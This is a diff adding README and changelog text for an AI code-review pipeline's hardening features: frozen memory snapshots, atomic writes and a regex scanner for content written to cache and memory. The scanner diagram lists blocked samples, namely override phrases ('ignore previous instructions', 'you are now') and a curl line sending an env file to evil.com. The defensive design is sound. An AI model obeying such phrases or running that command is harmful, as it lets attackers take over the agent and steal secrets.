@@ -433,6 +433,43 @@ scripts/signal-log.sh stats .          # aggregate signal statistics
 scripts/signal-log.sh learn .          # extract patterns for future reviews
 ```
 
+### Pipeline Hardening (Hermes Agent Patterns)
+
+Four patterns adapted from Hermes Agent for pipeline reliability:
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│  FROZEN SNAPSHOT                                             │
+│  ════════════════                                            │
+│  Pipeline start: read all 4 memory tiers → freeze           │
+│  Phase 1-7: use snapshot only (never live memory)            │
+│                                                              │
+│  Why: prevents mid-pipeline memory mutations from            │
+│  causing inconsistent agent behavior across phases           │
+├─────────────────────────────────────────────────────────────┤
+│  INJECTION SCANNING                                          │
+│  ══════════════════                                          │
+│  Every write to cache, memory, or signal log is scanned:     │
+│                                                              │
+│  ✗ "ignore previous instructions..."  → BLOCKED              │
+│  ✗ "you are now a helpful..."         → BLOCKED              │
+│  ✗ "curl https://evil.com/data.env"   → BLOCKED              │
+│  ✗ [zero-width unicode chars]         → BLOCKED              │
+│  ✓ Normal review data                 → ALLOWED              │
+├─────────────────────────────────────────────────────────────┤
+│  ATOMIC WRITES                                               │
+│  ═════════════                                               │
+│  mktemp → write → mv (never partial writes)                  │
+│  Signal log: flock -x for concurrent agent appends           │
+├─────────────────────────────────────────────────────────────┤
+│  SELF-IMPROVING GOTCHAS                                      │
+│  ════════════════════                                        │
+│  signal-log.sh learn  → extract false positive patterns      │
+│  signal-log.sh gotcha-suggest → generate agent Gotcha entries│
+│  signal-log.sh gotcha-suggest --save → persist for next run  │
+└─────────────────────────────────────────────────────────────┘
+```
+
 ### More in v3.4.0
 
 | Feature | Description |
@@ -608,6 +645,10 @@ Run `./scripts/run-benchmark.sh --verbose` to see Arena-only results.
 - **Ralph Loop** (`ralph-loop.sh`): Iterative review-fix-review loop with fresh context per iteration, runs until no critical/high findings remain (max 5 iterations)
 - **Review Daemon** (`review-daemon.sh`): Async ticket queue for background PR reviews with enqueue/process/status/list commands
 - **Review Visualization Templates** (`shared-phases/review-visualization.md`): 4 Mermaid diagram templates (severity pie, review flow, agent participation, intensity mindmap)
+- **Frozen Snapshot Pattern** (`pipeline_memory_snapshot()` in utils.sh): Reads all 4 memory tiers once at pipeline start; all subsequent phases use the frozen snapshot, preventing mid-pipeline mutations from causing inconsistent agent behavior
+- **Content Injection Scanning** (`validate_cache_content()` in utils.sh): Regex-based validation blocks prompt injection, identity overrides, data exfiltration URLs, and invisible unicode before any cache/memory/signal-log write
+- **Atomic File Writes** (`atomic_write()` in utils.sh): mktemp + mv pattern prevents partial-write corruption; signal-log uses flock-based atomic append for concurrent multi-agent safety
+- **Self-Improving Gotchas** (`signal-log.sh gotcha-suggest`): Converts false-positive patterns from signal log learnings into agent Gotcha suggestions; `--save` persists to short-term memory for next pipeline run
 - 40 agents (each +Gotchas), 39 scripts (was 37), 13 shared phases (was 10), 4 new config sections
 
 ### v3.3.0
